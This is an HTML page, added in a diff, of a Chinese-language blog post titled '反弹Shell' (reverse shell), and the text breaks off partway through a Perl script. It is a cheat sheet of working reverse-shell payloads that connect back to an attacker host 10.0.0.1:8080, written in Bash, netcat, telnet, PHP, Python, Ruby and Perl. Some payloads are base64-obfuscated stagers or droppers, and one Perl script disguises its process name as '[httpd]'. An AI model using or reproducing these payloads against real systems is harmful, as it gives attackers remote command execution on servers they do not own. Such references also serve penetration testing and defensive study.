@@ -1,0 +1,1333 @@
+<!DOCTYPE html>
+
+
+
+
+<html class="theme-next mist" lang="zh-Hans">
+<head>
+  <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+  <meta name="google-site-verification" content="googleaf0347feb5ea0936.html" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.2" rel="stylesheet" type="text/css" />
+
+
+  <meta name="keywords" content="shell," />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="Introspelliam" type="application/atom+xml" />
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.1.2" />
+
+
+
+
+
+
+<meta name="description" content="假设攻击端为10.0.0.1，接收端口为8080 服务器端为10.0.0.2 1、Bash关于bash中的重定向知识，可以参考shell之后的操作 服务器端： 1bash -i &amp;gt;&amp;amp; /dev/tcp/10.0.0.1/8080 0&amp;gt;&amp;amp;1 1bash -c &amp;apos;sh -i &amp;amp;&amp;gt;/dev/tcp/10.0.0.1/8080 0&amp;gt;&amp;amp;1&amp;a">
+<meta name="keywords" content="shell">
+<meta property="og:type" content="article">
+<meta property="og:title" content="反弹Shell">
+<meta property="og:url" content="http://yoursite.com/2017/12/09/web/反弹Shell/index.html">
+<meta property="og:site_name" content="Introspelliam">
+<meta property="og:description" content="假设攻击端为10.0.0.1，接收端口为8080 服务器端为10.0.0.2 1、Bash关于bash中的重定向知识，可以参考shell之后的操作 服务器端： 1bash -i &amp;gt;&amp;amp; /dev/tcp/10.0.0.1/8080 0&amp;gt;&amp;amp;1 1bash -c &amp;apos;sh -i &amp;amp;&amp;gt;/dev/tcp/10.0.0.1/8080 0&amp;gt;&amp;amp;1&amp;a">
+<meta property="og:image" content="http://yoursite.com/images/2017-12-10/43-300x71.png">
+<meta property="og:updated_time" content="2018-07-10T09:11:05.738Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="反弹Shell">
+<meta name="twitter:description" content="假设攻击端为10.0.0.1，接收端口为8080 服务器端为10.0.0.2 1、Bash关于bash中的重定向知识，可以参考shell之后的操作 服务器端： 1bash -i &amp;gt;&amp;amp; /dev/tcp/10.0.0.1/8080 0&amp;gt;&amp;amp;1 1bash -c &amp;apos;sh -i &amp;amp;&amp;gt;/dev/tcp/10.0.0.1/8080 0&amp;gt;&amp;amp;1&amp;a">
+<meta name="twitter:image" content="http://yoursite.com/images/2017-12-10/43-300x71.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '5.1.2',
+    sidebar: {"position":"right","display":"always","offset":0,"offset_float":0,"b2t":true,"scrollpercent":true,"onmobile":true},
+    fancybox: true,
+    tabs: true,
+    motion: false,
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2017/12/09/web/反弹Shell/"/>
+
+
+
+
+
+  <title>反弹Shell | Introspelliam</title>
+  
+
+
+
+
+
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?663212c5ef558c27e77385b620f14823";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <!-- hexo-inject:begin --><!-- hexo-inject:end --><div class="container sidebar-position-right page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Introspelliam</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <h1 class="site-subtitle" itemprop="description">Just do what works for you, because there will always be someone who thinks differently.</h1>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-sitemap">
+          <a href="/sitemap.xml" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-sitemap"></i> <br />
+            
+            站点地图
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/12/09/web/反弹Shell/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Introspelliam">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/me.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Introspelliam">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">反弹Shell</h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-12-09T23:53:55+08:00">
+                2017-12-09
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/web/" itemprop="url" rel="index">
+                    <span itemprop="name">web</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="page-pv"><i class="fa fa-file-o"></i>
+            <span class="busuanzi-value" id="busuanzi_value_page_pv" ></span>
+            </span>
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>假设攻击端为10.0.0.1，接收端口为8080</p>
+<p>服务器端为10.0.0.2</p>
+<h3 id="1、Bash"><a href="#1、Bash" class="headerlink" title="1、Bash"></a>1、Bash</h3><p>关于bash中的重定向知识，可以参考<a href="/2018/04/10/shell之后的操作/">shell之后的操作</a></p>
+<p>服务器端：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1</div></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">bash -c &apos;sh -i &amp;&gt;/dev/tcp/10.0.0.1/8080 0&gt;&amp;1&apos;</div></pre></td></tr></table></figure>
+<p>攻击端：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nc -lvvp 8080</div></pre></td></tr></table></figure>
+<h3 id="2、NetCat"><a href="#2、NetCat" class="headerlink" title="2、NetCat"></a>2、NetCat</h3><p>服务器端</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">nc -e /bin/sh 10.0.0.1 8080</div><div class="line">nc -e /bin/sh 10.0.0.1 8080</div></pre></td></tr></table></figure>
+<p>现在的很多/bin/nc -&gt; /etc/alternatives/nc -&gt; /bin/nc.openbsd</p>
+<p>但是实际上这个nc.openbsd不支持nc -e命令</p>
+<p>所以我们最好使用的是/bin/nc.traditional</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">/bin/nc.traditional -e /bin/sh 10.0.0.1 8080</div></pre></td></tr></table></figure>
+<p>当然若没有/bin/nc.traditional这个nc传统版，我们也可以使用下面的方法：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.0.0.1 8080 &gt;/tmp/f</div></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">本地监听两个端口,通过管道,一处输入,一处输出</div><div class="line">nc 10.0.0.1 2333|/bin/sh|nc 10.0.0.1 2444</div></pre></td></tr></table></figure>
+<p><img src="/images/2017-12-10/43-300x71.png" alt="img"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mknod /tmp/backpipe p &amp;&amp; /bin/sh 0&lt;/tmp/backpipe | nc 10.0.0.1 8080 1&gt;/tmp/backpipe</div></pre></td></tr></table></figure></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">将nc替换成telnet</div><div class="line">mknod backpipe p &amp;&amp; telnet 10.0.0.1 8080 0&lt;backpipe | /bin/bash 1&gt;backpipe</div></pre></td></tr></table></figure>
+<h3 id="3、PHP"><a href="#3、PHP" class="headerlink" title="3、PHP"></a>3、PHP</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">php -r &apos;$sock=fsockopen(&quot;10.0.0.1&quot;,8080);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&apos;</div></pre></td></tr></table></figure>
+<p>不知道怎么回事，这个反弹的shell并不能用。代码假设TCP连接的文件描述符为3，如果不行可以试下4,5,6。当然推荐使用下面的：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">php -r &apos;set_time_limit(0);$a=&quot;1.0&quot;;$b=&quot;10.0.0.1&quot;;$c=8080;$d=1400;$e=null;$f=null;$g=&quot;uname -a; w; id; /bin/sh -i&quot;;$h=0;$i=0;if(function_exists(&quot;pcntl_fork&quot;))&#123;$j=pcntl_fork();if($j==-1)&#123;printit(&quot;ERROR: Can not fork&quot;);exit(1);&#125;if($j)&#123;exit(0);&#125;if(posix_setsid()==-1)&#123;printit(&quot;Error: Can not setsid()&quot;);exit(1);&#125;$h=1;&#125;else&#123;printit(&quot;WARNING: Failed to daemonise.  This is quite common and not fatal.&quot;);&#125;chdir(&quot;/&quot;);umask(0);$k=fsockopen($b,$c,$l,$m,30);if(!$k)&#123;printit(&quot;$m ($l)&quot;);exit(1);&#125;$n=array(0=&gt;array(&quot;pipe&quot;,&quot;r&quot;),1=&gt;array(&quot;pipe&quot;,&quot;w&quot;),2=&gt;array(&quot;pipe&quot;,&quot;w&quot;));$o=proc_open($g,$n,$p);if(!is_resource($o))&#123;printit(&quot;ERROR: Can not spawn shell&quot;);exit(1);&#125;stream_set_blocking($p[0],0);stream_set_blocking($p[1],0);stream_set_blocking($p[2],0);stream_set_blocking($k,0);printit(&quot;Successfully opened reverse shell to $b:$c&quot;);while(1)&#123;if(feof($k))&#123;printit(&quot;ERROR: Shell connection terminated&quot;);break;&#125;if(feof($p[1]))&#123;printit(&quot;ERROR: Shell process terminated&quot;);break;&#125;$q=array($k,$p[1],$p[2]);$r=stream_select($q,$e,$f,null);if(in_array($k,$q))&#123;if($i)printit(&quot;SOCK READ&quot;);$s=fread($k,$d);if($i)printit(&quot;SOCK: $s&quot;);fwrite($p[0],$s);&#125;if(in_array($p[1],$q))&#123;if($i)printit(&quot;STDOUT READ&quot;);$s=fread($p[1],$d);if($i)printit(&quot;STDOUT: $s&quot;);fwrite($k,$s);&#125;if(in_array($p[2],$q))&#123;if($i)printit(&quot;STDERR READ&quot;);$s=fread($p[2],$d);if($i)printit(&quot;STDERR: $s&quot;);fwrite($k,$s);&#125;&#125;fclose($k);fclose($p[0]);fclose($p[1]);fclose($p[2]);proc_close($o);function printit($t)&#123;if(!$h)&#123;print&quot;$t\n&quot;;&#125;&#125;&apos;</div></pre></td></tr></table></figure>
+<p>或者</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">php -r &apos;function which($a)&#123;$b=execute(&quot;which $a&quot;);return($b?$b:$a);&#125;function execute($c)&#123;$d=&quot;&quot;;if($c)&#123;if(function_exists(&quot;exec&quot;))&#123;@exec($c,$d);$d=join(&quot;\n&quot;,$d);&#125;elseif(function_exists(&quot;shell_exec&quot;))&#123;$d=@shell_exec($c);&#125;elseif(function_exists(&quot;system&quot;))&#123;@ob_start();@system($c);$d=@ob_get_contents();@ob_end_clean();&#125;elseif(function_exists(&quot;passthru&quot;))&#123;@ob_start();@passthru($c);$d=@ob_get_contents();@ob_end_clean();&#125;elseif(@is_resource($e=@popen($c,&quot;r&quot;)))&#123;$d=&quot;&quot;;while(!@feof($e))&#123;$d.=@fread($e,1024);&#125;@pclose($e);&#125;&#125;return $d;&#125;function cf($g,$h)&#123;if($i=@fopen($g,&quot;w&quot;))&#123;@fputs($i,@base64_decode($h));@fclose($i);&#125;&#125;$j=&quot;10.0.0.1&quot;;$k=&quot;8080&quot;;$l=array(&quot;perl&quot;=&gt;&quot;perl&quot;,&quot;c&quot;=&gt;&quot;c&quot;);$m=&quot;IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGNtZD0gImx5bngiOw0KJHN5c3RlbT0gJ2VjaG8gImB1bmFtZSAtYWAiO2Vj&quot;.&quot;aG8gImBpZGAiOy9iaW4vc2gnOw0KJDA9JGNtZDsNCiR0YXJnZXQ9JEFSR1ZbMF07DQokcG9ydD0kQVJHVlsxXTsNCiRpYWRkcj1pbmV0X2F0b24oJHR&quot;.&quot;hcmdldCkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRwb3J0LCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKT&quot;.&quot;sNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoI&quot;.&quot;kVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQi&quot;.&quot;KTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgkc3lzdGVtKTsNCmNsb3NlKFNUREl&quot;.&quot;OKTsNCmNsb3NlKFNURE9VVCk7DQpjbG9zZShTVERFUlIpOw==&quot;;cf(&quot;/tmp/.bc&quot;,$m);$d=execute(which(&quot;perl&quot;).&quot; /tmp/.bc $j $k &amp;&quot;);&apos;</div></pre></td></tr></table></figure>
+<h3 id="4、Python"><a href="#4、Python" class="headerlink" title="4、Python"></a>4、Python</h3><p>以python2.7为例</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python -c &apos;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.0.1&quot;,8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&apos;</div></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python -c &quot;exec(\&quot;import socket, subprocess;s =socket.socket();s.connect((&apos;10.0.0.1&apos;,8080))\nwhile 1: proc =subprocess.Popen(s.recv(1024), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,stdin=subprocess.PIPE);s.send(proc.stdout.read()+proc.stderr.read())\&quot;)&quot;</div></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">若将</div><div class="line">import socket,subprocess,os</div><div class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</div><div class="line">s.connect((&quot;10.0.0.1&quot;,8080))</div><div class="line">os.dup2(s.fileno(),0)</div><div class="line">os.dup2(s.fileno(),1)</div><div class="line">os.dup2(s.fileno(),2)</div><div class="line">p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);</div><div class="line">base64加密后生成另外的shell</div><div class="line"></div><div class="line">python -c &apos;import base64;exec(base64.b64decode(&quot;aW1wb3J0IHNvY2tldCxzdHJ1Y3QKcz1zb2NrZXQuc29ja2V0KDIsMSkKcy5jb25uZWN0KCgnMTAuMC4wLjEnLDgwODApKQpsPXN0cnVjdC51bnBhY2soJz5JJyxzLnJlY3YoNCkpWzBdCmQ9cy5yZWN2KDQwOTYpCndoaWxlIGxlbihkKSE9bDoKCWQrPXMucmVjdig0MDk2KQpleGVjKGQseydzJzpzfSkK&quot;))&apos;</div></pre></td></tr></table></figure>
+<h3 id="5、Ruby"><a href="#5、Ruby" class="headerlink" title="5、Ruby"></a>5、Ruby</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ruby -rsocket -e&apos;f=TCPSocket.open(&quot;10.0.0.1&quot;,8080).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&apos;</div></pre></td></tr></table></figure>
+<p>不依赖于/bin/sh的</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ruby -rsocket -e &apos;exit if fork;c=TCPSocket.new(&quot;10.0.0.1&quot;,&quot;8080&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;)&#123;|io|c.print io.read&#125;end&apos;</div></pre></td></tr></table></figure>
+<p>windows环境下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ruby -rsocket -e &apos;c=TCPSocket.new(&quot;10.0.0.1&quot;,&quot;8080&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;)&#123;|io|c.print io.read&#125;end&apos;</div></pre></td></tr></table></figure>
+<p>MSF中的相应的反弹shell代码</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env ruby</span></div><div class="line"></div><div class="line"><span class="keyword">require</span> <span class="string">'socket'</span></div><div class="line"><span class="keyword">require</span> <span class="string">'open3'</span></div><div class="line"></div><div class="line"><span class="comment">#Set the Remote Host IP</span></div><div class="line">RHOST = <span class="string">"192.168.1.10"</span> </div><div class="line"><span class="comment">#Set the Remote Host Port</span></div><div class="line">PORT = <span class="string">"6667"</span></div><div class="line"></div><div class="line"><span class="comment">#Tries to connect every 20 sec until it connects.</span></div><div class="line"><span class="keyword">begin</span></div><div class="line">sock = TCPSocket.new <span class="string">"<span class="subst">#&#123;RHOST&#125;</span>"</span>, <span class="string">"<span class="subst">#&#123;PORT&#125;</span>"</span></div><div class="line">sock.puts <span class="string">"We are connected!"</span></div><div class="line"><span class="keyword">rescue</span></div><div class="line">  sleep <span class="number">20</span></div><div class="line">  <span class="keyword">retry</span></div><div class="line"><span class="keyword">end</span></div><div class="line"></div><div class="line"><span class="comment">#Runs the commands you type and sends you back the stdout and stderr.</span></div><div class="line"><span class="keyword">begin</span></div><div class="line">  <span class="keyword">while</span> line = sock.gets</div><div class="line">    Open3.popen2e(<span class="string">"<span class="subst">#&#123;line&#125;</span>"</span>) <span class="keyword">do</span> <span class="params">| stdin, stdout_and_stderr |</span></div><div class="line">              IO.copy_stream(stdout_and_stderr, sock)</div><div class="line">              <span class="keyword">end</span>  </div><div class="line">  <span class="keyword">end</span></div><div class="line"><span class="keyword">rescue</span></div><div class="line">  <span class="keyword">retry</span></div><div class="line"><span class="keyword">end</span></div></pre></td></tr></table></figure>
+<h3 id="6、Perl"><a href="#6、Perl" class="headerlink" title="6、Perl"></a>6、Perl</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">perl -e &apos;use Socket;$i=&quot;10.0.0.1&quot;;$p=8080;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&apos;</div></pre></td></tr></table></figure>
+<p>一个不依赖调用/bin/bash的方法</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">perl -MIO -e &apos;use IO::Socket;$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,&quot;10.0.0.1:8080&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&apos;</div></pre></td></tr></table></figure>
+<p>完整的perl反弹shell脚本</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/perl -w</span></div><div class="line"><span class="comment"># perl-reverse-shell - A Reverse Shell implementation in PERL</span></div><div class="line"><span class="keyword">use</span> strict;</div><div class="line"><span class="keyword">use</span> Socket;</div><div class="line"><span class="keyword">use</span> FileHandle;</div><div class="line"><span class="keyword">use</span> POSIX;</div><div class="line"><span class="keyword">my</span> $VERSION = <span class="string">"1.0"</span>;</div><div class="line"><span class="comment"># Where to send the reverse shell. Change these.</span></div><div class="line"><span class="keyword">my</span> $ip = <span class="string">'x.x.x.x'</span>;</div><div class="line"><span class="keyword">my</span> $port = <span class="number">2333</span>;</div><div class="line"><span class="comment"># Options</span></div><div class="line"><span class="keyword">my</span> $daemon = <span class="number">1</span>;</div><div class="line"><span class="keyword">my</span> $auth = <span class="number">0</span>; <span class="comment"># 0 means authentication is disabled and any</span></div><div class="line"><span class="comment"># source IP can access the reverse shell</span></div><div class="line"><span class="keyword">my</span> $authorised_client_pattern = <span class="string">qr(/^127\.0\.0\.1$/)</span>;</div><div class="line"><span class="comment"># Declarations</span></div><div class="line"><span class="keyword">my</span> $global_page = <span class="string">""</span>;</div><div class="line"><span class="keyword">my</span> $fake_process_name = <span class="string">"/usr/sbin/apache"</span>;</div><div class="line"><span class="comment"># Change the process name to be less conspicious</span></div><div class="line">$0 = <span class="string">"[httpd]"</span>;</div><div class="line"><span class="comment"># Authenticate based on source IP address if required</span></div><div class="line"><span class="keyword">if</span> (<span class="keyword">defined</span>($ENV&#123;<span class="string">'REMOTE_ADDR'</span>&#125;)) &#123;</div><div class="line">    cgiprint(<span class="string">"Browser IP address appears to be: $ENV&#123;'REMOTE_ADDR'&#125;"</span>);</div><div class="line">    <span class="keyword">if</span> ($auth) &#123;</div><div class="line">        <span class="keyword">unless</span> ($ENV&#123;<span class="string">'REMOTE_ADDR'</span>&#125; =~ $authorised_client_pattern) &#123;</div><div class="line">        cgiprint(<span class="string">"ERROR: Your client isn't authorised to view this page"</span>);</div><div class="line">        cgiexit();</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line">&#125; <span class="keyword">elsif</span> ($auth) &#123;</div><div class="line">    cgiprint(<span class="string">"ERROR: Authentication is enabled, but I couldn't determine your IP address. Denying access"</span>);</div><div class="line">    cgiexit(<span class="number">0</span>);</div><div class="line">&#125;</div><div class="line"><span class="comment"># Background and dissociate from parent process if required</span></div><div class="line"><span class="keyword">if</span> ($daemon) &#123;</div><div class="line">    <span class="keyword">my</span> $pid = <span class="keyword">fork</span>();</div><div class="line">    <span class="keyword">if</span> ($pid) &#123;</div><div class="line">        cgiexit(<span class="number">0</span>); <span class="comment"># parent exits</span></div><div class="line">    &#125;</div><div class="line">    setsid();</div><div class="line">    <span 